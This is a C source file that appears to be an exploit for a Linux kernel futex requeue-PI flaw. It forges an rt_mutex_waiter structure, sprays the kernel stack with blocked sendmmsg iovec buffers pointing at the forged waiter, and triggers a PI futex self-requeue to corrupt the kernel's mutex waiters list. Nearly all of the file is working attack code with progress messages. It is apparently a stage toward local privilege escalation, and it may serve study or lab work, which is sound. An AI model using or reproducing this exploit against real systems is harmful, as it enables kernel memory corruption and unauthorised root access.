#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "futex.h"
#include "errexit.h"

#define BLOCKBUF "AAAAAAAA"

int client_sockfd, server_sockfd;
struct sockaddr_in addr = {};

struct mmsghdr msgvec = {};
struct iovec msg[7] = {};

struct rt_mutex_waiter *fake_waiter, forged_waiter = {};

char buf[0x80] = {};

int *futexes, *non_pi_futex, *pi_futex;

void setup_msgs()
{
    int i;

    puts("[*] Setting up the messages for the kernel stack.");

    for (i = 0; i < sizeof(msg) / sizeof(msg[0]); i++)
    {
        msg[i].iov_base = &forged_waiter;
        msg[i].iov_len = sizeof(forged_waiter);
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);
}

void setup_fake_waiter()
{
    puts("[*] Setting up the fake waiter on the buffer.");

    fake_waiter = (struct rt_mutex_waiter *)(buf + sizeof(buf) - 8);
    fake_waiter->list_entry.prio = 120 + 12;
    fake_waiter->list_entry.prio_list.next = &forged_waiter.list_entry.prio_list;
}

void setup_sockets()
{
    puts("[*] Creating the client and server sockets for kernel stack modification.");
    int fds[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, fds) == -1)
        errExit("socketpair");

    client_sockfd = fds[0];
    server_sockfd = fds[1];
}

void alloc_futexes()
{
    puts("[*] Allocating the futexes.");

    futexes = mmap(NULL, sizeof(int) * 2, PROT_READ | PROT_WRITE,
                   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (futexes == MAP_FAILED)
        errExit("mmap");

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];
}

void forge_waiter()
{
    int ret;

    puts("[*] Placing the forged waiter on the mutex's waiters list.");

    while (send(client_sockfd, BLOCKBUF, strlen(BLOCKBUF), MSG_DONTWAIT) != -1)
    {
    }
    if (errno == EWOULDBLOCK)
    {
        if ((ret = sendmmsg(client_sockfd, &msgvec, 1, 0)) == -1)
            errExit("sendmmsg");
    }
    else
        errExit("send");
}

int main()
{
    printf("forged_waiter @ %p\n", &forged_waiter);

    setup_msgs();
    setup_fake_waiter();
    setup_sockets();
    alloc_futexes();

    flock(pi_futex);

    int pid = fork();
    if (pid == -1)
        errExit("fork");
    if (pid == 0)
    {
        fwait_requeue(non_pi_futex, pi_futex, 0);
        forge_waiter();
        exit(EXIT_SUCCESS);
    }

    sleep(1);
    frequeue(non_pi_futex, pi_futex, 1, 0);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    while (1)
    {
        printf("Second thread is still running!\n");
        sleep(1);
    }

    wait(NULL);
}
